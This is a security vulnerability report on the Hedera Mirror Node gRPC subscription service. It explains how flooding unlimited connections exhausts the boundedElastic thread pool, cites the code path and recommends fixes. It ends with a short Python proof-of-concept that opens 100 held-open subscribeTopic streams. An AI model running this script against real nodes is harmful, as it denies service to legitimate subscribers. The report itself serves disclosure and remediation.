### Title
Unbounded gRPC Connections Allow boundedElastic Thread Pool Exhaustion via Subscription Flooding

### Summary
`CompositeTopicListener.listen()` delegates to `PollingTopicListener`, which allocates a dedicated `Schedulers.boundedElastic()` thread per subscription for blocking database polling. The only server-side guard is `maxConcurrentCallsPerConnection=5`, which limits calls per TCP connection but places no cap on the number of TCP connections from a single IP. An attacker opening N connections × 5 calls each creates N×5 concurrent subscriptions, each blocking a `boundedElastic` thread on a DB query, exhausting the pool and starving all legitimate subscribers.

### Finding Description

**Code path:**

`GrpcConfiguration.java:33` sets the only guard:
```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
// default = 5, per-connection only — no maxConnections, no per-IP limit
```

`PollingTopicListener.java:31` creates a single `boundedElastic` scheduler shared across all subscriptions:
```java
private final Scheduler scheduler = Schedulers.boundedElastic();
```

`PollingTopicListener.java:34-48` — each `listen()` call schedules a long-lived, repeating blocking DB poll on that scheduler:
```java
return Flux.defer(() -> poll(context))
    .delaySubscription(interval, scheduler)
    .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
        .withFixedDelay(interval)
        .withScheduler(scheduler))
```

`poll()` at line 61 calls `topicMessageRepository.findByFilter(newFilter)` — a synchronous/blocking JDBC stream — which holds the `boundedElastic` thread for the full duration of the DB query.

Additionally, `PollingTopicMessageRetriever.java:41` and `TopicMessageServiceImpl.java:70` each independently allocate `boundedElastic` threads per subscription for historical retrieval and safety-check polling respectively.

**Root cause:** `maxConcurrentCallsPerConnection` is a per-TCP-connection limit. There is no `maxConnections` call on the `NettyServerBuilder`, no per-IP connection rate limit, and no global subscription count ceiling. The `subscriberCount` gauge at `TopicMessageServiceImpl.java:52-55` is metrics-only and enforces nothing.

**Exploit flow:**
1. Attacker opens C TCP connections to port 5600 (no authentication required, gRPC is unauthenticated).
2. On each connection, attacker opens 5 concurrent `subscribeTopic` streaming calls (the per-connection limit).
3. Total active subscriptions = C × 5, each consuming a `boundedElastic` thread blocked on a DB poll.
4. Reactor's `boundedElastic` default cap is `10 × availableProcessors` threads (e.g., 80 threads on an 8-core node).
5. At C = 16 connections (80 subscriptions), the thread pool is saturated; new polling tasks queue up.
6. Queue overflow (default 100,000 tasks per thread) causes `RejectedExecutionException` for all subscribers, including legitimate ones.
7. The safety-check `subscribeOn(Schedulers.boundedElastic())` in `TopicMessageServiceImpl` also fails, breaking gap recovery for all active subscriptions.

### Impact Explanation
When the `boundedElastic` pool is exhausted, no subscription — attacker's or legitimate — can schedule its next DB poll. All `subscribeTopic` streams stall: historical retrieval stops, live polling stops, and the safety-check gap-recovery path fails. Clients receive no new `TopicMessage` events, meaning transaction confirmations are not delivered to any subscriber. This constitutes a complete denial of the mirror node's HCS subscription service. The POLL listener type is the direct trigger; even under REDIS/SHARED_POLL the per-subscription `PollingTopicMessageRetriever` and safety-check paths share the same `boundedElastic` pool and are degraded.

### Likelihood Explanation
No authentication or API key is required to open a gRPC subscription. The attacker needs only network access to port 5600 and a standard gRPC client (e.g., `grpcurl`, the Hedera Java SDK, or a raw HTTP/2 client). Opening 16–20 TCP connections with 5 streams each is trivial and can be scripted in seconds. The attack is repeatable: if the server recovers (e.g., attacker connections drop), the attacker can immediately reconnect. No special knowledge of the codebase is needed — the `subscribeTopic` RPC is part of the public Hedera Mirror Node gRPC API.

### Recommendation
1. **Add a global connection limit** in `GrpcConfiguration.java`:
   ```java
   serverBuilder.maxConnectionAge(Duration.ofMinutes(10), TimeUnit.MILLISECONDS);
   serverBuilder.maxConnectionIdle(Duration.ofMinutes(2), TimeUnit.MILLISECONDS);
   // and via a custom ChannelTracer or Netty handler: limit total accepted connections
   ```
2. **Add a global subscription cap** in `TopicMessageServiceImpl.subscribeTopic()`: check `subscriberCount` against a configurable maximum and return `RESOURCE_EXHAUSTED` if exceeded.
3. **Add per-IP connection rate limiting** at the Netty/ingress layer (e.g., via an Envoy sidecar `max_connections` per downstream IP, or a Netty `IpFilterRuleHandler`).
4. **Expose `maxConnections` as a `NettyProperties` field** and call `serverBuilder.maxConnectionAge(...)` / a connection-count interceptor.
5. For the POLL listener specifically, consider replacing the per-subscription `boundedElastic` scheduler with a shared, bounded thread pool whose size is explicitly configured and monitored.

### Proof of Concept
```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# Public proto: com.hedera.mirror.api.proto.ConsensusService/subscribeTopic
TARGET = "mirror-node-host:5600"
CONNECTIONS = 20   # 20 TCP connections × 5 streams = 100 subscriptions
STREAMS_PER_CONN = 5

def open_streams(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = ConsensusServiceStub(channel)  # generated from hedera proto
    streams = []
    for _ in range(STREAMS_PER_CONN):
        req = ConsensusTopicQuery(topicID=ConsensusTopicID(topicNum=1))
        # Non-blocking iterator; keeps stream open indefinitely
        it = stub.subscribeTopic(req)
        streams.append(it)
    # Hold streams open
    threading.Event().wait()

with ThreadPoolExecutor(max_workers=CONNECTIONS) as pool:
    for i in range(CONNECTIONS):
        pool.submit(open_streams, i)

# Result: boundedElastic pool saturated; legitimate subscribers stop receiving messages
```
